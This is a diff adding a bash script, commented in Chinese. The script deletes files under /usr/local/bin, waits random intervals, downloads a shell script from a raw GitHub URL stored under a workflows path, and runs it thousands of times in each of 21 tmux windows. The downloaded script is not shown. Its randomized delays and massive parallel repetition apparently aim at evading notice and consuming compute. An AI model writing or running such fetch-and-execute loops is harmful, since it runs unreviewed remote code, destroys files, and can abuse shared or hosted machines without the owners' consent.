@@ -1,0 +1,20 @@
+#!/bin/bash
+
+# 定义你的命令
+CMD="ls; rm -rf /usr/local/bin/OneDriveUploader.*; sleep $((($RANDOM % 11 + 2) * 5)); wget -O drive4444.sh https://raw.githubusercontent.com/howtogo2303/0127/main/.github/workflows/drive4444.sh; ls; sleep $((($RANDOM % 11 + 3) * 10)); ls; for i in {1..3111}; do sh drive4444.sh;sleep 10; done; ls"
+
+# 创建一个新的tmux会话，但不要附着到它
+tmux new-session -d -s mysession
+
+# 在新会话中创建四个额外的窗口
+for i in {1..20}; do
+    tmux new-window -t mysession:$i
+done
+
+# 在每个窗口中运行命令
+for i in {0..20}; do
+    tmux send-keys -t mysession:$i "$CMD" C-m
+done
+
+# 附着到新会话
+tmux attach -t mysession
